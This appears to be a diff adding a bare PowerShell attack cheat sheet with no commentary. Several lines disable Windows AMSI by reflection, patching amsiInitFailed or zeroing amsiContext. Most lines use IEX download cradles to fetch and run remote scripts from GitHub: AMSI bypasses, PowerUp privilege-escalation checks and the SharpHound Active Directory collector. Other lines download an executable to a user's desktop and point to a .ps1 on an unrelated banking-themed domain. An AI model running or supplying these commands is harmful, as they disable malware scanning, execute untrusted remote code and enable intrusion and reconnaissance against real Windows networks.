@@ -1,0 +1,23 @@
+powershell.exe -exec bypass
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/amsi.txt')
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');
+Set-ExecutionPolicy Bypass -Scope Process -Force
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/senzee1984/Amsi_Bypass_In_2023/main/Attack_AmsiOpenSession.ps1')
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/senzee1984/Amsi_Bypass_In_2023/main/Attack_AmsiScanBuffer.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Neb2/asdweawdsaesw/main/bypass_1.ps1');
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Neb2/asdweawdsaesw/main/power_up_1.ps1'); Invoke-AllChecks
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');
+Invoke-BloodHound -CollectionMethod All
+
+$url = 'https://github.com/caioMichele/vCard/raw/main/ben_x64.exe'
+$output = 'C:\Users\testerp\Desktop\6dg_folder\ben_x64.exe'
+Invoke-WebRequest -Uri $url -OutFile $output
+$extractPath = 'C:\path\to\extract'
+
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/caioMichele/vCard/main/amsi2.txt"))
+http://mybankinglicense.com/ben.ps1
